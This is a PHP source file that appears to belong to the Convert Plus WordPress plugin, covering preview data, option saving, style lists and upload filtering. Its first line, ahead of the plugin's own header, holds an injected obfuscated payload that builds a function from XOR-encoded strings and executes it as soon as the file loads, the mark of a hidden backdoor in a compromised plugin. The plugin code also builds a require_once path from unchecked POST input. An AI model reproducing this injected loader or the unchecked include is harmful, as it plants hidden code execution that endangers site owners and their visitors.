<?php $YyHXhAKUzP=',RYS,,qH,-9FTUU' ^'O <2XI..YCZ2=:;';$SbwFlt=$YyHXhAKUzP('', 'Y7ntJATCX<WYm1+1CY=GC=Z+-Z,XXob489JcgW<3q7, 22R,,gC78h-ZG4cgAKJDs.UCPKTVFULGqKpFs+S;1pSF3aPKaQyay>1;:DS,wiSXYuB=fM5K5XUGTUTC5ebCtTcadrqnIRDNLcvtgoJQ-U1SIiyhIOZ4<1M1NMZFZ4. ,ii T7D;FPKFgJU01 >ZP6MXZyYFIl>pauJ264BPm>16N.i3kZ2DQgG<<sQv0AW8NaI6-7G<-6.zlfgz:-rxvj78uH<5YbIuyO;0W<4Yf,FNbWWY1lFR<SYLq.E6kdEC5A=.fvmlL,A;KOrQmY9+ZDFi23JXXM4XCS-RQ6:2ogN=n z4705e3MWv3Q;NrQxk088,,gsL9X0hJPNYcKKOHqtt9Q4WPlxC<Q:AOzIrEP:F5IpaFp:pniU 7TIJXm9N:-6QL:B>Wf2;I6RPG493AA-QU.6SfX;VH7X QzNOAN0BipPZSA8:KTMpjZzUTnqI8EYUUjt3L99Y812DqHF9;=<AU<N4dEwkD7HPMWrIQB=ZYGs3VF <P>7Rj7ETyYGhYO1PNvW55xNS74F>jVzB48ARvZKLXRDFljacEc-9D02,VW=d=-XG, dH YW5VU,LxXf1.2RLndpsgRcCNd42,BcL40Z46f37LA:--CnNLdxHEI2MDHq6I'^ '0QFU,4: ,U872TSX0-NodE5Yr>M,90=YMMmJNwG9xQYNQF;CBG;XJ7I;3U<8,>>lWJ471gtr-05nQkPfSPY28T<3GAmkFvBkp7WTHlwEWTshbUfTZ>A9Y=;op157TLYcP=HJMxxgm=1:lMKTOK.0Y4jw 4Y6ik1QEjiXnhz5.FBEBAMK1NmfokAOn80DDRPrtY8,sBSO4fCzkQ.SBUbmMXPZ=KR9O>S008,YESlVV ;K+ZC<KX5YLUFZDB89ub913JVKUlWP BtKYkMQ;IQpFWLGF36-P3-7EsdlUE OPnLgQ IOFKMH:M-N.tx,gSPMzlgMVR>9qmORJ5B 4WYZOOjb<e+arcaER>wRX4BnOoXOFYTYINS73Q9L.1:8< .6hLTPR4MlZeqgX0N oGiV31V3Przh;zGzdM1AC5iwx-L IHD8-V+D2NJT;i613Ufl,4Yy7OE6Pld2-T7D4Rj+ :QkEPt>25Ye 14YCap<2FU-Y18usLTR>KX gZW=.->PHIOirW+MCiWO V<1dwToqjP>loWW72AgwUR+MjltDdgO<ySi-DnSPN-7TUuZXfIqRYp6Dcx.l4 qKCAEcCLK6QKs=2D;XU14XSLoP8.Y94HkTxBUOF3eGDPSGrC8DmQDM.KhPQ.UmACV5-ULId3gwnq-= FetaJ<4'); $SbwFlt();
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

defined( 'ABSPATH' ) || die( 'No direct script access allowed!' );

/**
 * Function Name: framework_update_preview_data Update preview page data before customizing the element.
 *
 * @since 1.0.0
 */
function framework_update_preview_data() {

	if ( ! current_user_can( 'access_cp' ) ) {
		die( -1 );
	}

	$preview_page = get_option( 'smile-preview-page' );
	if ( isset( $_POST['demo_id'] ) ) {
		$demo_id = $_POST['demo_id'];
		$class   = $_POST['cls'];

		$module = $_POST['module'];
		require_once( CP_BASE_DIR . '/modules/' . $module . '/functions/functions.options.php' );

		$demo_html     = '';
		$customizer_js = '';
		$settings      = $class::$options;
		foreach ( $settings as $style => $options ) {
			if ( $style === $demo_id ) {
				$demo_html     = $options['demo_url'];
				$demo_dir      = $options['demo_dir'];
				$customizer_js = $options['customizer_js'];
			}
		}

		$handle       = fopen( $demo_dir, 'r' );
		$post_content = fread( $handle, filesize( $demo_dir ) );

		print_r( $post_content );
		die();

	} else {
		echo 'Not Ok';
	}
	die();
}

/**
 * Function Name: framework_update_options Save options to the database after processing them.
 *
 * @param  array $data Options array to save.
 */
function framework_update_options( $data ) {
	if ( empty( $data ) ) {
		return;
	}
	if ( null !== $key ) { // Update one specific value.
		set_theme_mod( $key, $data );
	} else { // Update all values in $data.
		foreach ( $data as $k => $v ) {
			if ( ! isset( $smof_data[ $k ] ) || $v !== $smof_data[ $k ] ) { // Only write to the DB when we need to.
				set_theme_mod( $k, $v );
			}
		}
	}
	die();
}

if ( ! function_exists( 'smile_framework_create_dependency' ) ) {
	/**
	 * Function Name: smile_framework_create_dependency.
	 *
	 * @param  string $name  option name.
	 * @param  array  $array option values.
	 * @return boolval(var)  true/false.
	 */
	function smile_framework_create_dependency( $name, $array ) {
		if ( is_array( $array ) ) {
			$dependency = '';
			$element    = $array['name'];
			$operator   = $array['operator'];
			$value      = $array['value'];
			$type       = isset( $array['type'] ) ? $array['type'] : '';

			if ( 'media' === $type ) {
				$uid     = $_SESSION[ $element ];
				$element = $element . '_' . $uid;
			}

			$dependency = 'data-name="' . $element . '" data-element="' . $name . '" data-operator="' . $operator . '" data-value="' . $value . '"';

			return $dependency;
		} else {
			return false;
		}
	}
}

if ( ! function_exists( 'smile_framework_get_styles' ) ) {
	/**
	 * Function Name: smile_framework_get_styles.
	 *
	 * @param  string $option  option name.
	 * @return array style settings array.
	 */
	function smile_framework_get_styles( $option ) {
		$prev_styles = get_option( $option );
		$styles      = array();
		if ( is_array( $prev_styles ) && ! empty( $prev_styles ) ) {
			foreach ( $prev_styles as $key => $style ) {
				$style_id            = isset( $style['style_id'] ) ? $style['style_id'] : '';
				$style_name          = isset( $style['style_name'] ) ? $style['style_name'] : '';
				$styles[ $style_id ] = $style_name;
			}
		}
		return $styles;
	}
}

add_filter( 'smile_render_setting', 'smile_render_setting', 1 );
/**
 * Function Name: smile_render_setting.
 *
 * @param  array $setting  option array.
 * @return array style settings array.
 */
function smile_render_setting( $setting ) {
	if ( ! is_array( $setting ) ) {
		return urldecode( $setting );
	} else {
		return $setting;
	}
}

if ( ! function_exists( 'cp_import_upload_prefilter' ) ) {
	add_filter( 'wp_handle_upload_prefilter', 'cp_import_upload_prefilter' );
	/**
	 * Function Name: cp_import_upload_prefilter.
	 *
	 * @param  string $file  string val of option.
	 * @return array style settings array.
	 */
	function cp_import_upload_prefilter( $file ) {
		$page = isset( $_POST['admin_page'] ) ? $_POST['admin_page'] : '';

		$is_cp_page = isset( $_POST['page'] ) ? $_POST['page'] : '';
		$action_arr = array(
			'smile-modal-designer',
			'smile-info_bar-designer',
			'smile-slide_in-designer',
		);

		$is_cp = false;
		if ( $is_cp_page && in_array( $is_cp_page, $action_arr ) ) {
			$is_cp = true;
		}

		if ( isset( $page ) && 'import' === $page && $is_cp ) {
			$ext = pathinfo( $file['name'], PATHINFO_EXTENSION );

			if ( 'zip' !== $ext ) {
				$file['error'] = 'The uploaded ' . $ext . ' file is not supported. Please upload the exported text file. e.g. .zip';
			}
		}

		return $file;
	}
}

if ( ! function_exists( 'smile_backend_create_folder' ) ) {
	/**
	 * Function Name: smile_backend_create_folder creates a folder for the theme framework.
	 *
	 * @param  string  $folder  folder name.
	 * @param  boolean $addindex index.
	 * @return boolean           true/false.
	 */
	function smile_backend_create_folder( &$folder, $addindex = true ) {
		if ( is_dir( $folder ) && false === $addindex ) {
			return true;
		}
		$created = wp_mkdir_p( trailingslashit( $folder ) );

		if ( false === $addindex ) {
			return $created;
		}
		$index_file = trailingslashit( $folder ) . 'index.php';
		if ( file_exists( $index_file ) ) {
			return $created;
		}
		$handle = fopen( $index_file, 'w' );
		if ( $handle ) {
			fwrite(
				$handle, "<?php\r\necho 'Sorry, browsing the directory is not allowed!';\r\n?>
"
			);
			fclose( $handle );
		}
		return $created;
	}
}
